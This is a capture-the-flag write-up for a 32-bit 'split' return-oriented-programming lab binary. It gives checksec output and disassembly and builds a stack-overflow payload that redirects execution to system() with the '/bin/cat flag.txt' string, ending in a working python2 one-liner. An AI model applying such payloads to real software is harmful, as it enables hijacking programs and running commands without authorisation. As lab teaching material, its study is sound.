### split
The problem guides has told you that same as ret2win, there is a 0x20 buffer, which can be overflowed, and there is still a syscall in a function named usefulFunction. 

But as in ret2win32, the buffer is actually 0x28 bytes.

First, check the binarat security.
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
NX is enabled. Therefore, we cannot execute shellcode in stack directly. Thankful, the hint has told us that there is a syscall in function. We only need to control return address to jump to the syscall place.
Use ghidra to track the code.

There is indeed a 0x28 buffer, and indeed a syscall in function usefulFunction.

However, the syscall command is not "/bin/cat flag.txt", "but /bin/ls".
```
...
08048615 68 0e 87        PUSH       s_/bin/ls_0804870e                               = "/bin/ls"
04 08
0804861a e8 c1 fd        CALL       system                                           int system(char * __command)
ff ff
...
```
Therefore, need to modify the command in the syscall, try to push "/bin/cat flag.txt" into the stack.

Use ghidra to find "/bin/cat flag.txt" in binary.
```
...
                     usefulString                                    XREF[1]:     Entry Point(*)  
0804a030 2f 62 69        ds         "/bin/cat flag.txt"
         6e 2f 63 
         61 74 20 

...
```
We find the string "/bin/cat flag.txt" in address 0x0804a030.

Because the syscall use value in stack as its argument. Therefore, the only thing we need to do is push this value into stack right after the return address(this return address should jump to syscall address, in order to execute syscall).

Then, we can construct our overflow strings.

Same as ret2win32, buffer size is 0x28, and a rbp address, so the strings should be:
```
strings = 'A'*40(40 bytes) + rbp(4 bytes) = 'A' * 44 //overflow 0x28 buffer and rbp register
```
Then, we jump to the syscall address.
we need to push the "/bin/cat flag.txt" address into stack, which will be used as syscall argument:
```
'\x1a\x86\x04\x08' //syscall address
```
Remember, we should directly jump to call system instruction. If we jump to the instruction right before it, the argument will be modified to "/bin/ls" again.

```
'\x30\xa0\x04\x08' //the value we want to push into stack, and will be used as syscall argument. 
```
The overflow string will be:
```
'A'*44 + '\x1a\x86\x04\x08' + '\x30\xa0\x04\x08'
```
Run the program with input:
```
python2 -c "print 'A'*44 + '\x1a\x86\x04\x08' + '\x30\xa0\x04\x08'" | ./split32
```
Get the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
